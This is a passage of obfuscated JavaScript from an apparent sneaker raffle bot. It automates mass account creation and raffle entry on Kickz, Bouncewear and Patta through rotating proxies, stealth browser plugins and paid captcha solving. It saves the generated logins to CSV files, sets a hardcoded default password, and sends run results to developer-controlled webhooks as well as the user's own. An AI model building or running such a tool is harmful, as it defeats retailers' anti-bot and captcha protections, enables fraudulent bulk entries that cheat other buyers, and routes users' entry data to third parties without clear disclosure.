            }), await _0x5e903a['waitForTimeout'](0x7d0), console['log'](_0x49028e() + '\x20[' + _0x33ca75['name'] + ']\x20Task\x20' + (_0x4c3999 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x5e903a['waitForSelector']('#continue_button', { 'timeout': 0x186a0 }), _0x5e903a['evaluate'](() => {
                const _0x557bfa = document['querySelector']('#continue_button');
                for (var _0x789767 = 0x0; _0x789767 < 0x5; _0x789767++) {
                    if (_0x557bfa) {
                        _0x557bfa['click']();
                        break;
                    } else
                        _0x4a79d2(0xfa0);
                }
            }), await _0x5e903a['waitForTimeout'](0x1194), await _0x5e903a['waitForSelector']('#continue_button'), _0x5e903a['evaluate'](() => {
                const _0x13d41f = document['querySelector']('#continue_button');
                for (var _0x49b227 = 0x0; _0x49b227 < 0x5; _0x49b227++) {
                    if (_0x13d41f) {
                        _0x13d41f['click']();
                        break;
                    } else
                        _0x4a79d2(0xfa0);
                }
            });
            try {
                await _0x5e903a['waitForSelector']('div[data-step=\x22thank_you\x22]'), console['log'](_0x3b3689['green'](_0x49028e() + '\x20[' + _0x33ca75['name'] + ']\x20Task\x20' + (_0x4c3999 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                if (_0xff80bf['webhook'] != undefined && _0xff80bf['webhook'] != '')
                    try {
                        await _0x2110d2(_0xff80bf['webhook'], _0x5e34a4['succesDEVMSG']);
                    } catch {
                    }
                await _0x4a79d2(0xc8), await _0x2110d2(_0x478ec4, _0x5e34a4['succesDEVMSG']), await _0x4a79d2(0xc8);
                try {
                    await _0x2110d2(_0x19d1c2, _0x5e34a4['succesPUBMSG']);
                } catch {
                }
            } catch (_0x4fb052) {
                console['log'](_0x3b3689['red'](_0x49028e() + '\x20[' + _0x33ca75['name'] + ']\x20Task\x20' + (_0x4c3999 + 0x1) + '\x20:\x20Entry\x20Failed:\x20' + _0x4fb052));
            }
        } catch (_0x312e70) {
            console['log'](_0x3b3689['red'](_0x49028e() + '\x20[' + _0x33ca75['name'] + ']\x20Task\x20' + (_0x4c3999 + 0x1) + '\x20:\x20' + _0x312e70)), _0x54431e = '' + _0x312e70;
            var _0x573346 = await _0x2df3ee(_0x31c597[_0x4c3999], _0x33ca75, 'dev', !![], _0x54431e);
            _0x5e34a4['errorDEV'] = { 'embeds': [_0x573346] }, _0xff80bf['webhook'] != undefined && _0xff80bf['webhook'] != '' && await _0x2110d2(_0xff80bf['webhook'], _0x5e34a4['errorDEV']), await _0x2110d2(_0x132dc8, _0x5e34a4['errorDEV']), _0x3ee6fb = 'yes';
        } finally {
            _0x4532d2 && _0x4532d2['close']();
            if (_0x3ee6fb == 'yes' && _0x21c648 != 0x5 && _0x54431e != 'Size\x20Not\x20Found') {
                console['log'](_0x3b3689['red'](_0x49028e() + '\x20[' + _0x33ca75['name'] + ']\x20Task\x20' + (_0x4c3999 + 0x1) + '\x20:\x20Retrying')), _0x4c3999 = _0x4c3999 - 0x1, _0x21c648 = _0x21c648 + 0x1;
                continue;
            }
            if (_0x4c3999 + 0x1 == _0x31c597['length']) {
                console['log'](_0x3b3689['green']('Finished\x20tasks,\x20returning\x20to\x20Main\x20Menu')), await _0x4a79d2(0x7d0);
                break;
            }
            console['log']('Waiting\x20for\x20' + _0xff80bf['AfewDelay'] + '\x20ms'), await _0x4a79d2(_0xff80bf['AfewDelay']);
        }
    }
};
async function _0x338e14(_0xccac00, _0xfb0143, _0x4e6593, _0x41ace1) {
    _0x479f93['use'](_0x16b6ec()), _0x479f93['use'](_0x50d2df({
        'provider': {
            'id': '2captcha',
            'token': '' + _0xff80bf['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x4ab08d = 0x0; _0x4ab08d < _0x4e6593['length']; _0x4ab08d++) {
        var _0x78d9d8 = '', _0x530cd6 = 0x0;
        _0x1dc4b6(_0xfb0143['name'] + '\x20Task\x20' + (_0x4ab08d + 0x1) + '\x20/\x20' + _0x4e6593['length'] + '\x20||\x20File:\x20' + _0x1198e4 + '\x20Proxies:\x20' + _0x4ec7b9), await _0x58b1b9(_0x4e6593, _0x4ab08d);
        var _0xca42b1 = [{
            'type': 'rich',
            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x446b97
                },
                {
                    'name': 'Delay',
                    'value': '' + _0xff80bf['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x49c529
                }
            ]
        }];
        const _0x20003d = { 'embeds': _0xca42b1 };
        var _0x352d0e = await _0x2df3ee(_0x4e6593[_0x4ab08d], _0xfb0143, 'acc', ![]);
        const _0x19e188 = { 'succesDEVMSG': { 'embeds': [_0x352d0e] } };
        if (_0x4e6593[_0x4ab08d]['Email'] == '' || _0x4e6593[_0x4ab08d]['FirstName'] == '' || _0x4e6593[_0x4ab08d]['LastName'] == '') {
            console['log'](_0x49028e() + '\x20[' + _0xfb0143['name'] + ']\x20Task\x20' + (_0x4ab08d + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        _0x4e6593[_0x4ab08d]['Password'] == '' && (_0x4e6593[_0x4ab08d]['Password'] = 'JRaffles23!');
        if (_0xff80bf['useRandomProxy'] = ![])
            var _0x3e8fed = _0x41ace1[_0x4ab08d]['split'](':');
        else
            var _0x3de072 = Math['round'](Math['random']() * (_0x41ace1['length'] - 0x1)), _0x3e8fed = _0x41ace1[_0x3de072]['split'](':');
        const _0x15f6b5 = await _0x479f93['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x3e8fed[0x0] + ':' + _0x3e8fed[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x1ba96b = await _0x15f6b5['newPage']();
            await _0x1ba96b['authenticate']({
                'username': '' + _0x3e8fed[0x2],
                'password': '' + _0x3e8fed[0x3]
            }), console['log'](_0x49028e() + '\x20[' + _0xfb0143['name'] + ']\x20Task\x20' + (_0x4ab08d + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1ba96b['setRequestInterception'](!![]), _0x1ba96b['on']('request', _0x77d236 => {
                _0x77d236['resourceType']() === 'image' || _0x77d236['resourceType']() === 'font' || _0x77d236['resourceType']() === 'media' ? _0x77d236['abort']() : _0x77d236['continue']();
            }), await _0x1ba96b['goto'](_0xccac00), await _0x4a79d2(0xbb8), console['log'](_0x49028e() + '\x20[' + _0xfb0143['name'] + ']\x20Task\x20' + (_0x4ab08d + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x1ba96b['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x1ba96b['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x1ba96b['waitForSelector']('#button-register'), await _0x4a79d2(0x7d0), await _0x1ba96b['evaluate'](() => {
                const _0x1c2e04 = document['querySelector']('#button-register');
                _0x1c2e04['click']();
            }), console['log'](_0x49028e() + '\x20[' + _0xfb0143['name'] + ']\x20Task\x20' + (_0x4ab08d + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x4a79d2(0x1388), await _0x1ba96b['waitForSelector']('#customer_salutation'), await _0x1ba96b['select']('#customer_salutation', 'mr'), await _0x4a79d2(0x7d0), await _0x1ba96b['waitForSelector']('#customer_firstname'), await _0x1ba96b['type']('#customer_firstname', '' + _0x4e6593[_0x4ab08d]['FirstName']), await _0x4a79d2(0x352), await _0x1ba96b['waitForSelector']('#customer_lastname'), await _0x1ba96b['type']('#customer_lastname', '' + _0x4e6593[_0x4ab08d]['LastName']), await _0x4a79d2(0x352), await _0x1ba96b['type']('#email-input', '' + _0x4e6593[_0x4ab08d]['Email']), await _0x4a79d2(0x352), await _0x1ba96b['type']('#email-confirm-input', '' + _0x4e6593[_0x4ab08d]['Email']), await _0x4a79d2(0x352), await _0x1ba96b['type']('#register-password', '' + _0x4e6593[_0x4ab08d]['Password']), await _0x4a79d2(0x352), await _0x1ba96b['type']('#password-confirm', '' + _0x4e6593[_0x4ab08d]['Password']), await _0x4a79d2(0x352), console['log'](_0x49028e() + '\x20[' + _0xfb0143['name'] + ']\x20Task\x20' + (_0x4ab08d + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x1ba96b['click']('#consent'), await _0x4a79d2(0x1f4);
            const _0x32817e = await _0x1ba96b['$']('div.inputErrorMsg.b-form_section-message');
            if (_0x32817e) {
                console['log'](_0x3b3689['red'](_0x49028e() + '\x20[' + _0xfb0143['name'] + ']\x20Task\x20' + (_0x4ab08d + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                continue;
            }
            await _0x1ba96b['click']('#buttonRegister');
            try {
                await _0x1ba96b['waitForSelector']('#verificationCode');
            } catch {
                throw new Error('Account\x20already\x20registered');
            }
            console['log'](_0x3b3689['yellow'](_0x49028e() + '\x20[' + _0xfb0143['name'] + ']\x20Task\x20' + (_0x4ab08d + 0x1) + '\x20:\x20Account\x20' + _0x4e6593[_0x4ab08d]['Email'] + '\x20Generated!')), console['log'](_0x3b3689['yellow'](_0x49028e() + '\x20[' + _0xfb0143['name'] + ']\x20Task\x20' + (_0x4ab08d + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x4e6593[_0x4ab08d]['Email'])), await _0x4a79d2(0x4b0);
            async function _0x3b27fd() {
                console['log'](_0x3b3689['yellow'](_0x49028e() + '\x20[' + _0xfb0143['name'] + ']\x20Task\x20' + (_0x4ab08d + 0x1) + '\x20:\x20Paste\x20your\x20verification\x20code\x20here:'));
                var _0xe535da = await _0x55f1ed['get']('Code');
                return _0xe535da['Code'];
            }
            ;
            code = await _0x3b27fd(), _0x4a79d2(0x320), console['log'](_0x49028e() + '\x20[' + _0xfb0143['name'] + ']\x20Task\x20' + (_0x4ab08d + 0x1) + '\x20:\x20Verifying..'), await _0x1ba96b['type']('#verificationCode', code), await _0x4a79d2(0x1f4), await _0x1ba96b['click']('#buttonVerify'), await _0x4a79d2(0x190), await _0x1ba96b['click']('#buttonVerify'), await _0x4a79d2(0x3e8);
            try {
                await _0x1ba96b['waitForSelector']('div.b-user_greeting'), console['log'](_0x3b3689['green'](_0x49028e() + '\x20[' + _0xfb0143['name'] + ']\x20Task\x20' + (_0x4ab08d + 0x1) + '\x20:\x20Account\x20' + _0x4e6593[_0x4ab08d]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x7af797['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x4e6593[_0x4ab08d]['Email'] + ',' + _0x4e6593[_0x4ab08d]['Password'] + ','), console['log'](_0x49028e() + '\x20[' + _0xfb0143['name'] + ']\x20Task\x20' + (_0x4ab08d + 0x1) + '\x20:\x20Account\x20' + _0x4e6593[_0x4ab08d]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                try {
                    _0xff80bf['webhook'] != undefined && _0xff80bf['webhook'] != '' && await _0x2110d2(_0xff80bf['webhook'], _0x19e188['succesDEVMSG']);
                } catch {
                }
                await _0x2110d2(_0x18784f, _0x19e188['succesDEVMSG']);
            } catch {
                console['log'](_0x3b3689['red'](_0x49028e() + '\x20[' + _0xfb0143['name'] + ']\x20Task\x20' + (_0x4ab08d + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x3b3689['red'](_0x49028e() + '\x20[' + _0xfb0143['name'] + ']\x20Task\x20' + (_0x4ab08d + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
            }
        } catch (_0x3041c5) {
            console['log'](_0x3b3689['red'](_0x49028e() + '\x20[' + _0xfb0143['name'] + ']\x20Task\x20' + (_0x4ab08d + 0x1) + '\x20:\x20' + _0x3041c5)), _0xca42b1[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0xca42b1[0x0]['description'] = '' + _0x3041c5, await _0x2110d2(_0x132dc8, _0x20003d), _0x78d9d8 = 'yes';
        } finally {
            _0x15f6b5 && _0x15f6b5['close']();
            if (_0x78d9d8 == 'yes' && _0x530cd6 != 0x5) {
                console['log'](_0x3b3689['red'](_0x49028e() + '\x20[' + _0xfb0143['name'] + ']\x20Task\x20' + (_0x4ab08d + 0x1) + '\x20:\x20Retrying')), _0x4ab08d = _0x4ab08d - 0x1, _0x530cd6 = _0x530cd6 + 0x1;
                continue;
            }
            console['log']('Waiting\x20for\x20' + _0xff80bf['delay'] + '\x20ms'), await _0x4a79d2(_0xff80bf['delay']);
        }
    }
}
async function _0x369bcb(_0x4ab7c2, _0x493575, _0x1af0be) {
    _0x479f93['use'](_0x16b6ec()), _0x479f93['use'](_0x50d2df({
        'provider': {
            'id': '2captcha',
            'token': '' + _0xff80bf['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0xda6835 = 0x0; _0xda6835 < _0x493575['length']; _0xda6835++) {
        var _0x544c2c, _0x4541d3 = '', _0x2feb66 = 0x0;
        _0x1dc4b6(_0x4ab7c2['name'] + '\x20Task\x20' + (_0xda6835 + 0x1) + '\x20/\x20' + _0x493575['length'] + '\x20||\x20File:\x20' + _0x1198e4 + '\x20Proxies:\x20' + _0x4ec7b9);
        var _0x3651db = [{
            'type': 'rich',
            'title': 'Succesful\x20Kickz\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x446b97
                },
                {
                    'name': 'Product',
                    'value': '' + _0x493575[_0xda6835]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x493575[_0xda6835]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0xff80bf['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x49c529
                }
            ]
        }], _0x36ffa3 = await _0x2df3ee(_0x493575[_0xda6835], _0x4ab7c2, 'dev', ![]), _0x2e2731 = await _0x2df3ee(_0x493575[_0xda6835], _0x4ab7c2, 'pub', ![]);
        const _0x430b97 = {
            'succesDEVMSG': { 'embeds': [_0x36ffa3] },
            'succesPUBMSG': { 'embeds': [_0x2e2731] }
        };
        await _0x58b1b9(_0x493575, _0xda6835);
        if (_0x493575[_0xda6835]['Email'] == '' || _0x493575[_0xda6835]['Password'] == '' || _0x493575[_0xda6835]['FirstName'] == '' || _0x493575[_0xda6835]['LastName'] == '') {
            console['log'](_0x49028e() + '\x20[' + _0x4ab7c2['name'] + ']\x20Task\x20' + (_0xda6835 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0xff80bf['useRandomProxy'] = ![])
            var _0x20d2ca = _0x1af0be[_0xda6835]['split'](':');
        else
            var _0x49e63b = Math['round'](Math['random']() * (_0x1af0be['length'] - 0x1)), _0x20d2ca = _0x1af0be[_0x49e63b]['split'](':');
        const _0x529e77 = await _0x479f93['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x20d2ca[0x0] + ':' + _0x20d2ca[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x53781b = await _0x529e77['newPage']();
            await _0x53781b['authenticate']({
                'username': '' + _0x20d2ca[0x2],
                'password': '' + _0x20d2ca[0x3]
            }), console['log'](_0x49028e() + '\x20[' + _0x4ab7c2['name'] + ']\x20Task\x20' + (_0xda6835 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x53781b['setRequestInterception'](!![]), _0x53781b['on']('request', _0xa1e00b => {
                _0xa1e00b['resourceType']() === 'image' || _0xa1e00b['resourceType']() === 'font' || _0xa1e00b['resourceType']() === 'media' ? _0xa1e00b['abort']() : _0xa1e00b['continue']();
            }), await _0x53781b['goto']('' + _0x493575[_0xda6835]['Url'], { 'waitUntil': 'networkidle2' }), await _0x4a79d2(0x12c);
            try {
                await _0x53781b['click']('a[title=\x22Sign\x20In\x22]');
            } catch {
                await _0x53781b['click']('a[title=\x22sign\x20in\x22]');
            }
            console['log'](_0x49028e() + '\x20[' + _0x4ab7c2['name'] + ']\x20Task\x20' + (_0xda6835 + 0x1) + '\x20:\x20Logging\x20in'), await _0x53781b['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x53781b['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x53781b['waitForSelector']('#username'), await _0x53781b['type']('#username', _0x493575[_0xda6835]['Email']), await _0x53781b['waitForSelector']('#password'), await _0x53781b['type']('#password', _0x493575[_0xda6835]['Password']), await _0x4a79d2(0x190), await _0x53781b['click']('#buttonSubmit'), await _0x53781b['waitForSelector']('div.b-user_greeting'), console['log'](_0x49028e() + '\x20[' + _0x4ab7c2['name'] + ']\x20Task\x20' + (_0xda6835 + 0x1) + '\x20:\x20Getting\x20Product'), await _0x4a79d2(0x1f4), await _0x53781b['goto']('' + _0x493575[_0xda6835]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x49028e() + '\x20[' + _0x4ab7c2['name'] + ']\x20Task\x20' + (_0xda6835 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x493575[_0xda6835]['Size']);
            let _0x34c9e6 = _0x493575[_0xda6835]['Size']['replace']('.5', '\x201/2');
            await _0x53781b['click']('button[title=\x22' + _0x34c9e6 + '\x22]'), await _0x4a79d2(0x1f4);
            try {
                await _0x53781b['click']('button[data-tau=\x22add_new_address\x22]');
            } catch {
            }
            await _0x4a79d2(0x12c), console['log'](_0x49028e() + '\x20[' + _0x4ab7c2['name'] + ']\x20Task\x20' + (_0xda6835 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x53781b['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x4a79d2(0x12c), await _0x53781b['type']('#dwfrm_raffle_addressFields_firstName', _0x493575[_0xda6835]['FirstName']), await _0x4a79d2(0x12c), await _0x53781b['type']('#dwfrm_raffle_addressFields_lastName', _0x493575[_0xda6835]['LastName']), await _0x4a79d2(0x12c), await _0x53781b['select']('#dwfrm_raffle_addressFields_country', _0x493575[_0xda6835]['Country']), await _0x4a79d2(0x12c), await _0x53781b['type']('#dwfrm_raffle_addressFields_city', _0x493575[_0xda6835]['City']), await _0x4a79d2(0x12c);
            _0x493575[_0xda6835]['Postcode'] == undefined && (_0x493575[_0xda6835]['Postcode'] = _0x493575[_0xda6835]['Zip']);
            await _0x53781b['type']('#dwfrm_raffle_addressFields_postalCode', _0x493575[_0xda6835]['Postcode']), await _0x4a79d2(0x12c), await _0x53781b['type']('#dwfrm_raffle_addressFields_address1', _0x493575[_0xda6835]['Address1']), await _0x4a79d2(0x12c), await _0x53781b['type']('#dwfrm_raffle_addressFields_address2', _0x493575[_0xda6835]['HouseNumber']), await _0x4a79d2(0x12c), await _0x53781b['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x493575[_0xda6835]['Address2']), await _0x4a79d2(0x12c), await _0x53781b['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x4a79d2(0x12c), await _0x53781b['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x493575[_0xda6835]['Follower']), await _0x4a79d2(0x1f4), await _0x53781b['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x4a79d2(0x1f4), console['log'](_0x49028e() + '\x20[' + _0x4ab7c2['name'] + ']\x20Task\x20' + (_0xda6835 + 0x1) + '\x20:\x20' + _0x3b3689['blue']('Awaiting\x20Paypal\x20Payment')), await _0x53781b['click']('.b-paypal_button');
            try {
                await _0x53781b['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), console['log'](_0x3b3689['green'](_0x49028e() + '\x20[' + _0x4ab7c2['name'] + ']\x20Task\x20' + (_0xda6835 + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0xff80bf['webhook'] != undefined && _0xff80bf['webhook'] != '' && await _0x2110d2(_0xff80bf['webhook'], _0x430b97['succesDEVMSG']), await _0x4a79d2(0xc8), await _0x2110d2(_0x478ec4, _0x430b97['succesDEVMSG']), await _0x4a79d2(0xc8), await _0x2110d2(_0x19d1c2, _0x430b97['succesPUBMSG']);
            } catch (_0x542938) {
                console['log'](_0x3b3689['red'](_0x49028e() + '\x20[' + _0x4ab7c2['name'] + ']\x20Task\x20' + (_0xda6835 + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x542938)), _0x544c2c = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x542938;
                var _0x31ea8d = await _0x2df3ee(_0x493575[_0xda6835], _0x4ab7c2, 'dev', !![], _0x544c2c);
                _0x430b97['errorDEV'] = { 'embeds': [_0x31ea8d] }, _0xff80bf['webhook'] != undefined && _0xff80bf['webhook'] != '' && await _0x2110d2(_0xff80bf['webhook'], _0x430b97['errorDEV']), await _0x2110d2(_0x132dc8, _0x430b97['errorDEV']);
            }
        } catch (_0x2111c7) {
            console['log'](_0x3b3689['red'](_0x49028e() + '\x20[' + _0x4ab7c2['name'] + ']\x20Task\x20' + (_0xda6835 + 0x1) + '\x20:\x20' + _0x2111c7)), _0x544c2c = '' + _0x2111c7;
            var _0x31ea8d = await _0x2df3ee(_0x493575[_0xda6835], _0x4ab7c2, 'dev', !![], _0x544c2c);
            _0x430b97['errorDEV'] = { 'embeds': [_0x31ea8d] }, _0xff80bf['webhook'] != undefined && _0xff80bf['webhook'] != '' && await _0x2110d2(_0xff80bf['webhook'], _0x430b97['errorDEV']), await _0x2110d2(_0x132dc8, _0x430b97['errorDEV']), _0x4541d3 = 'yes';
        } finally {
            _0x529e77 && _0x529e77['close']();
            if (_0x4541d3 == 'yes' && _0x2feb66 != 0x5) {
                console['log'](_0x3b3689['red'](_0x49028e() + '\x20[' + _0x4ab7c2['name'] + ']\x20Task\x20' + (_0xda6835 + 0x1) + '\x20:\x20Retrying')), _0xda6835 = _0xda6835 - 0x1, _0x2feb66 = _0x2feb66 + 0x1;
                continue;
            }
            console['log']('Waiting\x20for\x20' + _0xff80bf['AfewDelay'] + '\x20ms'), await _0x4a79d2(_0xff80bf['AfewDelay']);
        }
    }
}
async function _0x395185(_0x53c985, _0x2dbb8a) {
    _0x479f93['use'](_0x16b6ec()), _0x479f93['use'](_0x50d2df({
        'provider': {
            'id': '2captcha',
            'token': '' + _0xff80bf['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x4a1ede = 0x0; _0x4a1ede < bouncewear['length']; _0x4a1ede++) {
        await _0x58b1b9(bouncewear, _0x4a1ede);
        if (bouncewear[_0x4a1ede]['Email'] == '' || bouncewear[_0x4a1ede]['Password'] == '' || bouncewear[_0x4a1ede]['FirstName'] == '' || bouncewear[_0x4a1ede]['LastName'] == '') {
            console['log'](_0x49028e() + '\x20[' + _0x1adfd5[taskModule]['name'] + ']\x20Task\x20' + (_0x4a1ede + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0xff80bf['useRandomProxy'] = ![])
            var _0x1af479 = _0x240e91()[_0x4a1ede]['split'](':');
        else
            var _0x469ace = Math['round'](Math['random']() * (_0x240e91()['length'] - 0x1)), _0x1af479 = _0x240e91()[_0x469ace]['split'](':');
        const _0x27fa4b = await _0x479f93['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x1af479[0x0] + ':' + _0x1af479[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0xa4b029 = await _0x27fa4b['newPage']();
            await _0xa4b029['authenticate']({
                'username': '' + _0x1af479[0x2],
                'password': '' + _0x1af479[0x3]
            }), console['log'](_0x49028e() + '\x20[' + _0x2dbb8a['name'] + ']\x20Task\x20' + (_0x4a1ede + 0x1) + '\x20:\x20Getting\x20Session'), await _0xa4b029['setRequestInterception'](!![]), _0xa4b029['on']('request', _0x201e0c => {
                _0x201e0c['resourceType']() === 'image' || _0x201e0c['resourceType']() === 'font' || _0x201e0c['resourceType']() === 'media' ? _0x201e0c['abort']() : _0x201e0c['continue']();
            }), await _0xa4b029['goto'](_0x53c985), await _0x4a79d2(0xbb8), await _0xa4b029['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x49028e() + '\x20[' + _0x2dbb8a['name'] + ']\x20Task\x20' + (_0x4a1ede + 0x1) + '\x20:\x20Filling\x20information'), await _0xa4b029['type']('#RegisterForm-FirstName', '' + bouncewear[_0x4a1ede]['FirstName']), await _0x4a79d2(0x226), await _0xa4b029['type']('#RegisterForm-LastName', '' + bouncewear[_0x4a1ede]['LastName']), await _0x4a79d2(0x226), await _0xa4b029['type']('#RegisterForm-email', '' + bouncewear[_0x4a1ede]['Email']), await _0x4a79d2(0x226), await _0xa4b029['type']('#RegisterForm-password', '' + bouncewear[_0x4a1ede]['Password']), await _0x4a79d2(0x226), await _0xa4b029['click']('#marketing'), console['log'](_0x49028e() + '\x20[' + _0x2dbb8a['name'] + ']\x20Task\x20' + (_0x4a1ede + 0x1) + '\x20:\x20Submitting..'), await _0xa4b029['$eval']('#RegisterForm', _0x9edc66 => _0x9edc66['submit']()), await _0x4a79d2(0x1f40), console['log'](_0x49028e() + '\x20[' + _0x2dbb8a['name'] + ']\x20Task\x20' + (_0x4a1ede + 0x1) + '\x20:\x20Solving\x20Captcha'), await _0xa4b029['solveRecaptchas'](), await _0xa4b029['click']('.shopify-challenge__button.btn');
            async function _0x2305bd() {
                for (var _0x23fb2e = 0x0; _0x23fb2e < 0x4; _0x23fb2e++) {
                    try {
                        console['log']('try'), await _0xa4b029['waitForSelector']('.shopify-challenge__error', { 'timeout': 0x1388 }), console['log'](_0x49028e() + '\x20[' + _0x2dbb8a['name'] + ']\x20Task\x20' + (_0x4a1ede + 0x1) + '\x20:\x20' + _0x3b3689['red']('Catpcha\x20failed,\x20retrying..')), await _0xa4b029['solveRecaptchas'](), await _0xa4b029['click']('.shopify-challenge__button.btn');
                    } catch {
                        console['log']('catch');
                        break;
                    }
                }
            }
            await _0x2305bd(), console['log'](_0x49028e() + '\x20[' + _0x2dbb8a['name'] + ']\x20Task\x20' + (_0x4a1ede + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x4a79d2(0x1f4);
            try {
                await _0xa4b029['waitForSelector']('.featured-title'), await _0x4a79d2(0x1f4), console['log'](_0x3b3689['green'](_0x49028e() + '\x20[' + _0x2dbb8a['name'] + ']\x20Task\x20' + (_0x4a1ede + 0x1) + '\x20:\x20Account\x20' + bouncewear[_0x4a1ede]['Email'] + '\x20Generated!')), _0x7af797['appendFileSync']('../accounts/bouncewear.csv', '\x0a' + bouncewear[_0x4a1ede]['Email'] + ',' + bouncewear[_0x4a1ede]['Password']), console['log'](_0x3b3689['yellow'](_0x49028e() + '\x20[' + _0x2dbb8a['name'] + ']\x20Task\x20' + (_0x4a1ede + 0x1) + '\x20:\x20Account\x20' + bouncewear[_0x4a1ede]['Email'] + '\x20Saved\x20in\x20\x27accounts/bouncewear.csv\x27'));
            } catch (_0x1acb76) {
                console['log'](_0x3b3689['red'](_0x49028e() + '\x20[' + _0x1adfd5[taskModule]['name'] + ']\x20Task\x20' + (_0x4a1ede + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x1acb76));
            }
        } catch (_0x5d60db) {
            console['log'](_0x3b3689['red'](_0x49028e() + '\x20[' + _0x1adfd5[taskModule]['name'] + ']\x20Task\x20' + (_0x4a1ede + 0x1) + '\x20:\x20' + _0x5d60db));
        } finally {
            _0x27fa4b && _0x27fa4b['close'](), console['log']('Waiting\x20for\x20' + _0xff80bf['delay'] + '\x20ms'), await _0x4a79d2(_0xff80bf['delay']);
        }
    }
}
async function _0x7b262d(_0x442b94, _0x39ff46, _0x2f34af, _0xa018e5) {
    _0x479f93['use'](_0x16b6ec()), _0x479f93['use'](_0x50d2df({
        'provider': {
            'id': '2captcha',
            'token': '' + _0xff80bf['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x1b2f6d = 0x0; _0x1b2f6d < _0x2f34af['length']; _0x1b2f6d++) {
        var _0x8657e0 = [{
            'type': 'rich',
            'title': 'Succesful\x20Patta\x20Account\x20Generated',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x446b97
                },
                {
                    'name': 'Delay',
                    'value': '' + _0xff80bf['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x49c529
                }
            ]
        }];
        const _0x54087e = { 'embeds': _0x8657e0 };
        _0x1dc4b6(_0x39ff46['name'] + '\x20Task\x20' + (_0x1b2f6d + 0x1) + '\x20/\x20' + _0x2f34af['length'] + '\x20||\x20File:\x20' + _0x1198e4 + '\x20Proxies:\x20' + _0x4ec7b9), await _0x58b1b9(_0x2f34af, _0x1b2f6d);
        var _0xb6016 = await _0x2df3ee(_0x2f34af[_0x1b2f6d], _0x39ff46, 'acc', ![]);
        const _0x162902 = { 'succesDEVMSG': { 'embeds': [_0xb6016] } };
        if (_0x2f34af[_0x1b2f6d]['Email'] == '' || _0x2f34af[_0x1b2f6d]['FirstName'] == '' || _0x2f34af[_0x1b2f6d]['LastName'] == '') {
            console['log'](_0x49028e() + '\x20[' + _0x1adfd5[taskModule]['name'] + ']\x20Task\x20' + (_0x1b2f6d + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x4a79d2(0x7d0);
            continue;
        }
        (_0x2f34af[_0x1b2f6d]['Password'] == '' || _0x2f34af[_0x1b2f6d] == undefined) && _0x2f34af[_0x1b2f6d]['Password'] == 'JRaffles23!';
        if (_0xff80bf['useRandomProxy'] = ![])
            var _0x159701 = _0xa018e5[_0x1b2f6d]['split'](':');
        else
            var _0xcc0f64 = Math['round'](Math['random']() * (_0xa018e5['length'] - 0x1)), _0x159701 = _0xa018e5[_0xcc0f64]['split'](':');
        const _0x348acb = await _0x479f93['launch']({
            'headless': !![],
            'args': [
